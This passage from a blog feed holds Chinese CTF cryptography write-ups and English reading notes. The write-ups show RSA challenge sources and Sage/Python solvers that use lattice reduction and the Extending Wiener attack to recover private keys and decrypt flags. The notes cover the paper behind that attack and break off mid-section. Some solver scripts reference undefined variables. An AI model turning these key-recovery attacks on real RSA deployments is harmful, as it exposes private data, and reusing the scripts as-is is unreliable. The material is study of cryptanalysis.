&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    token = []</span><br><span class="line">    data = []</span><br><span class="line">    offset = []</span><br><span class="line">    array = re.findall(<span class="string">r&#x27;\d+&#x27;</span>, resp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(i) &gt; <span class="number">1</span>:</span><br><span class="line">            data.append(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        psend = i + <span class="number">1</span></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i != j:</span><br><span class="line">                <span class="built_in">sum</span> += A / (psend - j)</span><br><span class="line">        offset.append(<span class="built_in">sum</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        con.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        con.sendline(<span class="built_in">str</span>(i + <span class="number">1</span>))</span><br><span class="line">        resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">        token.append(<span class="built_in">round</span>(<span class="built_in">float</span>(re.findall(<span class="string">r&#x27;let me show you the answer: (.*)&#x27;</span>, resp)[<span class="number">0</span>])-offset[data.index(i)]))</span><br><span class="line">    print(token)</span><br><span class="line">    presend = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> token:</span><br><span class="line">        presend += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    con.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">    con.sendline(presend)</span><br><span class="line">    resp = con.recvuntil(<span class="string">&#x27;[-] &#x27;</span>).decode()</span><br><span class="line">    print(resp)</span><br><span class="line"><span class="comment"># flag&#123;dfd7a22a-0ac7-4b7a-9dad-9d321fa2fcfa&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x03-fatcor"><a href="#0x03-fatcor" class="headerlink" title="0x03 fatcor"></a>0x03 fatcor</h1><blockquote><p>对着某个paper写了一下午的algorithm, 没做出来, tcltcltcl…..</p><p>等wp出来再总结一下</p><p>结果一个师傅教我了hh</p></blockquote><h2 id="problem-3"><a href="#problem-3" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_public_key</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        N, phi, not_phi = p * q, (p - <span class="number">1</span>) * (q - <span class="number">1</span>), (p + <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e = inverse(d, not_phi)</span><br><span class="line">            <span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> (N, e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pubkey, m</span>):</span></span><br><span class="line">    N, e = pubkey</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">d = getPrime(<span class="number">300</span>)</span><br><span class="line">pubkeys = [get_public_key(d), get_public_key(d)]</span><br><span class="line">cs = encrypt(pubkeys[<span class="number">0</span>], m), encrypt(pubkeys[<span class="number">1</span>], m)</span><br><span class="line">print(pubkeys)</span><br><span class="line">print(cs)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[(115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177, 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611), (53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229, 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003)]</span></span><br><span class="line"><span class="string">(51861394323132582263685584977796608641129485967610029542263453128833142621927008505594685713111162217651119546991411861320042282788909858323941435593508384080858965324662410947546608051702238057613339996124961723578887443100478753831786550701578678090466528863014222331341645240511640398819027209200809466160, 53200507591144017820710284362261363695745231005527161900426580605551005076410241969689161754211964469126847594337121140420040532547631617290907291418063708630323838133357597795892690304405706577096504918510233628396424543417886828387510407109281423448827267022542075484645277275676556239547911837897827866040)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>抄了那么久的paper居然是用格子做的! 感谢d33b4t0师傅指点才弄出这题</p><p>这题给出了一个300-bit的$d$, 再根据这个$d$生成了两套公钥$n_1,n_2,e_1,e_2$</p><p>关系式为<br>$$<br>e_1 \cdot d = 1 + k_1(p_1+1)(q_1+1) \\<br>e_2 \cdot d = 1 + k_2(p_2+1)(q_2+1)<br>$$<br>记$p_1+q_1+1 = s_1, p_2+q_2+1 = s_2$, 把式子化一下就有<br>$$<br>e_1 \cdot d - k_1n_1 = k_1s_1+1 \\<br>e_2 \cdot d - k_2n_2 = k_2s_2+1<br>$$<br>自己做的时候只用的其中的一个式子造二维格子, 结果死活都规约不出来(也不知道为啥, 以后能造三维就试试造三维吧.</p><p>用这两个式子造出一个三维格子<br>$$<br>(d ,-k_1,-k_2) =<br>\begin{pmatrix}<br>\sqrt n_1&amp;e_1&amp;e_2 \\<br>0&amp;n_1&amp;0 \\<br>0&amp;0&amp;n_2<br>\end{pmatrix}<br>=(d\sqrt n_1,k_1s_1+1,k_2s_2+1)<br>$$<br>(至于为啥有个$\sqrt n_1$, 当然是为了调整一下范数! 向量的长度也是合适的(得靠$d, k ,s$的位数来判断</p><p>通过规约这个格子, 有了$(d\sqrt n_1,k_1s_1+1,k_2s_2+1)$, 就能得出$d$</p><p>剩下的就是已知$e,d,n$求$phi$了, 不过这里的$d$有点不太一样注意一下就ok了</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b ,isPrime</span><br><span class="line">n1 = <span class="number">115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177</span></span><br><span class="line">n2 = <span class="number">53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229</span></span><br><span class="line">e1 = <span class="number">57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611</span></span><br><span class="line">e2 = <span class="number">37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003</span></span><br><span class="line">half_n = <span class="built_in">round</span>(sqrt(n))</span><br><span class="line"></span><br><span class="line">L = Matrix([[half_n     ,e1  ,e2],</span><br><span class="line">            [<span class="number">0</span>       ,n1  ,<span class="number">0</span>],</span><br><span class="line">            [<span class="number">0</span>       ,<span class="number">0</span>   ,n2]])</span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">abs</span>(res[<span class="number">0</span>]) % half_n == <span class="number">0</span></span><br><span class="line">d = <span class="built_in">abs</span>(res[<span class="number">0</span>]) // half_n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isPrime(d) :</span><br><span class="line">    knophi = e1 *d - <span class="number">1</span></span><br><span class="line">    nophi = knophi // (knophi // n1 )</span><br><span class="line">    pq = nophi - n - <span class="number">1</span></span><br><span class="line">    phi = n -pq +<span class="number">1</span></span><br><span class="line">    d1 = inverse_mod(e1,phi)</span><br><span class="line">    print(l2b(<span class="built_in">pow</span>(cs[<span class="number">0</span>],d1,n1)))</span><br><span class="line"><span class="comment"># b&#x27;vnctf&#123;7d47956b-bc55-4897-a550-cda0b221ce67&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这题做完感觉收获还是有的, 不像前面的几题</p><p>Lattice是一个神奇的东西, 一定要把所有方程写出来, 该联立的联立, 根据未知量和已知量以及这些数的位数,<br>造出合适的Lattice才能求出出题人想要我们规约出的那个最短向量来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这次比赛听说是签到难度, 就做了一下, 结果也没能ak (说简单都是骗人的…)&lt;br&gt;嗯… 会做的题也没什么收获, 硬要说的话, whitegive的第一层需要通过运算把已知的条件合在一起或者消去一些不可能求出的参数, 这个一直都是密码分析的基础吧, 来看看题吧&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="WirteUp" scheme="http://tearsjin.github.io/tags/WirteUp/"/>
    
  </entry>
  
  <entry>
    <title>2020纵横杯 comon-Extending Wiener attack</title>
    <link href="http://tearsjin.github.io/2021/03/12/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-comon-Extending-Wiener-attack/"/>
    <id>http://tearsjin.github.io/2021/03/12/2020%E7%BA%B5%E6%A8%AA%E6%9D%AF-comon-Extending-Wiener-attack/</id>
    <published>2021-03-12T11:33:50.000Z</published>
    <updated>2021-03-13T11:46:51.187Z</updated>
    
    <content type="html"><![CDATA[<h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 =  <span class="number">28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line">e2 =  <span class="number">131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line">N =  <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">f1 = bytes_to_long(flag[:<span class="number">21</span>])</span><br><span class="line">f2 = bytes_to_long(flag[<span class="number">21</span>:])</span><br><span class="line">c1 = <span class="built_in">pow</span>(f1, e1, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(f2, e2, N)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;e1 = &quot;</span>, e1)</span><br><span class="line">print(<span class="string">&quot;e2 = &quot;</span>, e2)</span><br><span class="line">print(<span class="string">&quot;N = &quot;</span>, N)</span><br><span class="line">print(<span class="string">&quot;c1 = &quot;</span>, c1)</span><br><span class="line">print(<span class="string">&quot;c2 = &quot;</span>, c2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题一看还以为是简单的Common Attack, 只有同一个明文, 不同的$e$才能用Common Attack 这里显然两个密文对应的不是同一个明文…<br>这种题估计都有什么攻击方法, 后来找wp看了, 果然是有一种攻击方法的, 把paper(Extending Wiener’s Attack in the Presence of Many Decrypting Exponents)详细的学了一遍, 才明白具体该怎么解,</p><p>这个攻击方法适用于$e$特别大, 并且有多个$e$的时候(显然$e$还有大到可以直接winner)<br>大概思路是造一个格子求出参数让问题转变成winner要解决的问题(连分数的分解), 但是这里$g$是为1的所以不需要连分数可以直接求出phi</p><p>构造格子的方法paper里有, 阅读笔记里也有这里就不多说, 直接造!<br>$$<br>L_2 =<br>\begin{pmatrix}<br>N&amp;-M_1N&amp;0&amp;N^2 \\<br>0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N \\<br>0&amp;0&amp;M_2e_2&amp;-e_2N \\<br>0&amp;0&amp;0&amp;e_1e_2<br>\end{pmatrix}<br>$$<br>这里$M_1 = N^{1 \over 2},M_2 = N^{1+\alpha_2},\alpha_2 = {5 \over 14 } - \epsilon’$<br>LLL()规约出基$b =(b_1,b_2,b_3,b_4)$后求phi即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e1 =  <span class="number">28720970875923431651096339432854172528258265954461865674640550905460254396153781189674547341687577425387833579798322688436040388359600753225864838008717449960738481507237546818409576080342018413998438508242156786918906491731633276138883100372823397583184685654971806498370497526719232024164841910708290088581</span></span><br><span class="line">e2 =  <span class="number">131021266002802786854388653080729140273443902141665778170604465113620346076511262124829371838724811039714548987535108721308165699613894661841484523537507024099679248417817366537529114819815251239300463529072042548335699747397368129995809673969216724195536938971493436488732311727298655252602350061303755611563</span></span><br><span class="line">N =  <span class="number">159077408219654697980513139040067154659570696914750036579069691821723381989448459903137588324720148582015228465959976312274055844998506120677137485805781117564072817251103154968492955749973403646311198170703330345340987100788144707482536112028286039187104750378366564167383729662815980782817121382587188922253</span></span><br><span class="line">c1 =  <span class="number">89410578059910615243542114610890994179298819076294899300341196922537672226283347286177838507350481980653301675042566354947161446918391494634173771489921535378415952543761341962187827617956463740415683816828323475428328607025791449389552492799278886876413138326117622825124519567340298133646090783889193450681</span></span><br><span class="line">c2 =  <span class="number">106022564245731443282859231814772725680579944691962958987527668508496192529331599682371642691880849071915084510118117099828154554231286326729922119326305261125960484865171940233343041874124811917291652357776045940511178855947892557181650249473057939642726565131933445072147505756108121271288834439942107732015</span></span><br><span class="line"><span class="keyword">for</span> epsilon <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    M1 = <span class="built_in">int</span>(N^(<span class="number">0.5</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>(N^(<span class="number">1</span>+<span class="number">5</span>/<span class="number">14</span> - (epsilon*<span class="number">0.01</span>)))</span><br><span class="line">    <span class="comment">#epsilon是没办法确定的, 小小的爆破一下</span></span><br><span class="line">    v1 = vector([N,-M1*N,<span class="number">0</span>,N^<span class="number">2</span>])</span><br><span class="line">    v2 = vector([<span class="number">0</span>,M1*e1,-M2*e1,-e1*N])</span><br><span class="line">    v3 = vector([<span class="number">0</span>,<span class="number">0</span>,M2*e2,-e2*N])</span><br><span class="line">    v4 = vector([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e2])</span><br><span class="line"></span><br><span class="line">    L = Matrix([v1,v2,v3,v4])</span><br><span class="line">    B = L.LLL()[<span class="number">0</span>]</span><br><span class="line">    B = L.solve_left(B)</span><br><span class="line"></span><br><span class="line">    phi = floor(e1 * B[<span class="number">1</span>]//B[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 这边phi会前后差1或者差2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d1 = inverse_mod(e1,phi+j)</span><br><span class="line">            d2 = inverse_mod(e2,phi+j)</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c1,d1,N)) + long_to_bytes(<span class="built_in">pow</span>(c2,d2,N))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> flag <span class="keyword">and</span> <span class="string">b&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                print(i,flag)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>看完了理论自己代码实现的时候还是会有不少问题的..</p><p>这里有一个<code>Matrix.solve_left</code>和<code>Matrix.solve_right</code>的区别, 也没怎么搞懂, 主要是不知道这两个到底什么时候用什么, 只能先每次都试试这两个了.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;problem&quot;&gt;&lt;a href=&quot;#problem&quot; class=&quot;headerlink&quot; title=&quot;problem&quot;&gt;&lt;/a&gt;problem&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="CryptoSummary" scheme="http://tearsjin.github.io/categories/CryptoSummary/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Extending Wiener Attack" scheme="http://tearsjin.github.io/tags/Extending-Wiener-Attack/"/>
    
    <category term="Lattice" scheme="http://tearsjin.github.io/tags/Lattice/"/>
    
  </entry>
  
  <entry>
    <title>Reading notes Extending Wiener&#39;s Attack in the Presence of Many Decrypting Exponents</title>
    <link href="http://tearsjin.github.io/2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/"/>
    <id>http://tearsjin.github.io/2021/03/12/Reading-notes-Extending-Wiener-s-Attack-in-the-Presence-of-Many-Decrypting-Exponents/</id>
    <published>2021-03-12T04:54:13.000Z</published>
    <updated>2021-03-13T11:06:25.690Z</updated>
    
    <content type="html"><![CDATA[<h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>the purpose of this paper is given only several public exponents for a given modulus and the know-ledge of the corresponding private being quiet small.</p><h2 id="Low-Private-Exponent-Attacks-on-RSA"><a href="#Low-Private-Exponent-Attacks-on-RSA" class="headerlink" title="Low Private Exponent Attacks on RSA"></a>Low Private Exponent Attacks on RSA</h2><h3 id="Wiener’s-Approach"><a href="#Wiener’s-Approach" class="headerlink" title="Wiener’s Approach"></a>Wiener’s Approach</h3><p>The Wiener’s Attack in this paper not the same as I had learnt before.<br>$$<br>e \cdot d  - k \lambda(N) = 1 \<br>$$</p><p>Let $ \lambda(N) = {(p-1)(q-1) \over g} , s = 1 - p - q$ then we have<br>$$<br>e \cdot d - {k(p-1)(q-1) \over g} \<br>= e \cdot d - {k(N+s) \over g} = 1 \<br>$$</p><p>$$<br>egd - kN = g + ks \tag{1}<br>$$</p><p>Dividing both side of equation (1) by $dgN$<br>$$<br>{e \over N} - {k \over dg} = {g + ks \over dgN} = ({k \over dg})({s\over N})+{1 \over dN}<br>$$<br>Because $e \approx N$ and $s \approx N^{1 \over 2}$, we have ${k \over dg} \approx 1$, hence $({k \over dg})({s\over N})+{1 \over dN} \approx N^{-{1 \over 2}}$</p><p>Then we need to quote an important conclusion:</p><p>if<br>$$<br>|x - {a \over b }| &lt; {1 \over 2b^2}<br>$$<br>then ${a\over b} $ is a continued fraction approximant of $ x$</p><p>so if<br>$$<br>N^{-{1 \over 2}}&lt;{1 \over 2(dg)^2}\<br>$$<br>then ${k \over dg}$ will be a continued fraction approximant of $ {e \over N}$</p><p>Condition can convert to gm<br>$$<br>d &lt; {2^{-{1\over 2}}N^{1\over4} \over g} \tag{2}<br>$$<br>and g will be small under the assumption that $\lambda(N) \approx N$(but  $g \ge 2 $ since p,q is odd)<br>when we get $dg$ , we can factor N so that break the RSA cryptosystem.</p><h3 id="Guo’s-Approach"><a href="#Guo’s-Approach" class="headerlink" title="Guo’s Approach"></a>Guo’s Approach</h3><p>This approach assumes that one has more than one $e_i$ for a given N, and each of these $e_i$ has a relatively small $d_i$.</p><p>For 2 encryption exponents, we have following relations:<br>$$<br>e_1d_1g - k_1(p-1)(q-1) = g \<br>e_2d_2g - k_2(p-1)(q-1) = g<br>$$<br>Multiplying the first by $k_2$ and the second by $k_1$, and Subtraction of two formulas gives<br>$$<br>k_2d_1e_1 - k_1d_2e_2 = k_2 - k_1 \tag{3}<br>$$<br>Dividing both sides of equation 3 by $k_2d_1e_2$<br>$$<br>{e_1 \over e_2} - {k_1d_2 \over k_2d_1} = {k_2 - k_1 \over k_2d_1e_2}<br>$$<br>and assuming that the $d_i$ are at most $N^{\alpha}$ , so the right-hand side is about $N^{-(1 + \alpha)}$<br>if we want the fraction $k_1d_2 \over k_2d_1$ could be a continued fraction approximant of $e_1 \over e_2$, we must have<br>$$<br>2(k_2d_1)^2 &lt; N^{1 + \alpha}<br>$$<br>and with the assumption that $k_2$ and $d_1$ are at most $N^{\alpha}$ and the g is small this condition will be true where $\alpha  = {1 \over 3} - \epsilon $ with $\epsilon &gt; 0$</p><p>But known the $k_2d_1$ and $k_1d_2$ can not break the RSA cryptosystem for two reason.<br>The solution is omitted here ….</p><h3 id="Overview-of-our-Extension-Approach"><a href="#Overview-of-our-Extension-Approach" class="headerlink" title="Overview of our Extension Approach"></a>Overview of our Extension Approach</h3><p>This approach also assumes that we have more than one $e_i$ and each of these $e_i$ has a relatively small $d_i$ and the bounds of $d_i \ (i = 1,2,\cdots,n)$ is:</p><p>The $d$ can  as large as $N^{\alpha} $ where<br>$$<br>{(2n+1)2^n - (2n+1) { n \choose n/2 }<br>\over<br>(2n-2)2^n + (4n+2) { n \choose n/2 }}<br> \quad if\ n\ is\ even<br> \\<br> {(2n+1)2^n - 4n {n-1\choose (n-1)/2 }<br> \over<br> (2n-2)2^n + 8n {n-1\choose (n-1)/2}}<br>\quad if\ n\ is\ odd,<br>$$<br>For some reason , the attack is only practical for small $n$(the number of $e$, not the modulus $N$).</p><h2 id="An-Extension-in-the-Presence-of-Many-Small-Decryption-Exponents"><a href="#An-Extension-in-the-Presence-of-Many-Small-Decryption-Exponents" class="headerlink" title="An Extension in the Presence of Many Small Decryption Exponents"></a>An Extension in the Presence of Many Small Decryption Exponents</h2><h3 id="Preliminaries"><a href="#Preliminaries" class="headerlink" title="Preliminaries"></a>Preliminaries</h3><p>Let us refer to the relations of the form<br>$$<br>W_i = d_ige_i - k_iN =g+ k_is \<br>G_{i,j} = k_id_je_j - k_jd_ie_i = k_i - k_j<br>$$<br>we shall also assume, for a given $n$, that the $d_i$ and $k_i$ are at most $N^{\alpha_{n}}$, the $g$ is very small, the $s$ is about $N^{1 \over 2}$</p><h2 id="RSA-in-the-presence-of-2-Small-Decryption-Exponents"><a href="#RSA-in-the-presence-of-2-Small-Decryption-Exponents" class="headerlink" title="RSA in the presence of 2 Small Decryption Exponents"></a>RSA in the presence of 2 Small Decryption Exponents</h2><p>If we have two small decryption exponents,then the following relations hold:$W_1, G_{1,2},W_1W_2,$ or more explicitly:  (这部分英文没看懂, 把原句抄下来了)<br>$$<br>d_1ge_1 - k_1N =g +k_1s, \\<br>k_1d_2e_2 - k_2d_1e_1 = k_1 - k_2,\\<br>d_1d_2g^{2}e_1e_2 - d_1gk_2e_1N - d_2gk_1e_2N + k_1k_2N^2 = (g + k_1s)(g+ k_2s)<br>$$<br>Multiplying the first by $k_2$ , we may write these equations in the matrix form below.<br>$$<br>(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)\begin{pmatrix}1&amp;-N&amp;0&amp;N^2 \\ 0&amp;e_1&amp;-e_1&amp;-e_1N \\  0&amp;0&amp;e_2&amp;-e_2N \\  0&amp;0&amp;0&amp;e_1e_2\end{pmatrix} \\  =(k_1k_2,k_2(g+k_1s),k_1-k_2,(g+k_1s)(g+k_2s))<br>$$<br>The sizes of the entries of the vectors on the right-hand side are at most $N^{2\alpha_2} , N^{2\alpha_2 + {1 \over 2}}, N^{\alpha_2},N^{1+2\alpha_2} $respectively</p><p>Multiplying the first three columns of the matrix by $N,M_1=N^{1\over2},M_2=N^{1+\alpha_2}$ respectively, which gives following matrix:<br>$$<br>L_2=\begin{pmatrix}N&amp;-M_1N&amp;0&amp;N^2\\0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N\\0&amp;0&amp;M_2e_2&amp;-e_2N\\0&amp;0&amp;0&amp;e_1e_2\end{pmatrix}<br>$$<br>In this case the vector $b=(k_1k_2,d_1gk_2,d_2gk_1,d_1d_2g^2)$ will be such that<br>$$<br>||bL_2|| &lt; 2N^{1+2\alpha_2}.<br>$$<br>if the Lattice $L_2$ is pretty “random” , there are almost no lattice points of $L_2$ shorter than the Minkowski bounds $2\Delta^{1\over 4}$. Under this assumptions, then $bL_2$ is the shortest point in $L_2$, if<br>$$<br>2N^{1+2\alpha_2}&lt;({1\over{c_2}})(N^{ {13\over2}+\alpha_2})^{1\over4}<br>$$<br> for some small $c_2$, which is true if<br>$$<br>\alpha_2&lt;{5\over 14}-\epsilon<br>$$</p><p>So, if$\alpha_2&lt;{5\over14}-\epsilon$, the vector $b = (b_1,b_2,b_3,b_4)$ can be found via Lattice basis reduction algorithms(e.g. LLL), so that we can calculate ${d_1g \over k_1} = {b2 \over b1}$. Then we can factor N via wiener’s approach.</p><h3 id="RSA-in-the-presence-of-3-Small-Decryption-Exponents"><a href="#RSA-in-the-presence-of-3-Small-Decryption-Exponents" class="headerlink" title="RSA in the presence of 3 Small Decryption Exponents"></a>RSA in the presence of 3 Small Decryption 